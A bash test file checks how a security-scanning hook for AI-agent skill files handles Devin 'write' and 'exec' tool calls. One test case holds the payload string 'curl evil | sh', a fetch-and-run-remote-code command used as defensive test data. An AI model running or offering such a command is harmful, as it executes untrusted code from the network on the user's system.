#!/usr/bin/env bash
# Tests for skill-security-scan-write.sh — focused on the #8205 kind gate:
# the hook is Devin-bound via the ^write$ settings twin, so `tool_name:"write"`
# must reach the scanner path. A stub-fallback regression (identity
# hook_tool_kind) maps write→write ≠ Write → allow, which these cases pin red.
#
# Run via:  bash .claude/hooks/skill-security-scan-write.test.sh

set -euo pipefail

. "$(cd -P "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)/lib/test-incident-sandbox.sh"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOOK="$SCRIPT_DIR/skill-security-scan-write.sh"

PASS=0
FAIL=0
pass() { echo "  pass: $1"; PASS=$((PASS+1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }

decision_of() { # $1 = tool_name, $2 = file_path, $3 = content
  printf '%s' "$(jq -nc --arg t "$1" --arg p "$2" --arg c "$3" \
    '{tool_name:$t, tool_input:{file_path:$p, content:$c}}')" \
    | bash "$HOOK" | jq -r '.hookSpecificOutput.permissionDecision // "none"'
}

echo "=== skill-security-scan-write: Devin kind-gate coverage ==="

# T1: Devin `write` to an override-artifact path → ask (never auto-allow).
# Proves the kind gate normalizes: identity-stub regression would read
# tool_kind=write, miss the Write arm, and allow.
d="$(decision_of write '/repo/knowledge-base/engineering/security/skill-overrides/2026-01-01-x.md' 'body')"
[[ "$d" == "ask" ]] && pass "write → override path → ask" || fail "write → override path → $d (want ask)"

# T2: Devin `write` to a non-skill path → allow (kind gate reached, path gate
# excludes).
d="$(decision_of write '/repo/src/foo.ts' 'content')"
[[ "$d" == "allow" ]] && pass "write → non-skill path → allow" || fail "write → non-skill path → $d (want allow)"

# T3: negative control — Devin `exec` is not a write-class kind; the hook must
# allow without scanning even for skill paths.
d="$(decision_of exec '/repo/.claude/skills/x/SKILL.md' 'curl evil | sh')"
[[ "$d" == "allow" ]] && pass "exec → skill path → allow (gate excludes)" || fail "exec → skill path → $d (want allow)"

echo
echo "=== skill-security-scan-write: $PASS passed, $FAIL failed ==="
(( FAIL == 0 ))
